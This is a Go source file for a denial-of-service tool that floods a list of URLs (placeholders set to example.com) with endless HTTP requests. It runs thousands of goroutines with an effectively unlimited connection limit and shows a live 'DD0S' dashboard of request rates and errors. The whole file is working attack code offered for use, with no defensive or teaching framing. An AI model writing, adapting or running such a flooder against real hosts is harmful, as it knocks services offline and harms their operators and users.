package main

import (
	"fmt"
	"runtime"
	"sync/atomic"
	"time"

	"github.com/gookit/color"
	"github.com/valyala/fasthttp"
)

var client = fasthttp.Client{MaxConnsPerHost: 99999999}
var count uint64
var errors uint64

var urls = [50]string{
"https://example.com/",
"https://example.com/"}

func main() {
	cpus := runtime.NumCPU()
	runtime.GOMAXPROCS(cpus)

	for i := 0; i < cpus*20; i++ {
		for _, url := range urls {
			go func(url string) {
				for {
					sendRequest(url)
					atomic.AddUint64(&count, 1)
				}
			}(url)
		}
	}

	fmt.Println("Launching Attack...")

	startTime := time.Now()

	for {
		time.Sleep(500 * time.Millisecond)

		timeElapsed := float64(time.Since(startTime).Round(1*time.Second)) / 1000000000

		fmt.Print("\033[H\033[2J")
		fmt.Println(color.Cyan.Render("P4K3CH ") + color.Yellow.Render("DD0S!") + "\n")
		fmt.Print("Requests/s: ")
		color.Yellow.Printf("%d\n", uint64(float64(count)/timeElapsed))
		fmt.Print("Total requests: ")
		color.Yellow.Printf("%d\n", count)
		fmt.Print("Successfull requests: ")
		color.Green.Printf("%d\n", count-errors)
		fmt.Print("Successfull requests/s: ")
		color.Green.Printf("%d\n", uint64(float64(count-errors)/timeElapsed))
		fmt.Print("Errors: ")
		color.Red.Printf("%d\n", errors)
		fmt.Print("Uptime: ")
		fmt.Println(color.Cyan.Render(time.Since(startTime).Round(1 * time.Second)))
	}
}

func sendRequest(host string) {
	req := fasthttp.AcquireRequest()
	req.SetRequestURI(host)
	res := fasthttp.AcquireResponse()

	err := client.Do(req, res)

	if err != nil {
		atomic.AddUint64(&errors, 1)
	}

	fasthttp.ReleaseRequest(req)
}
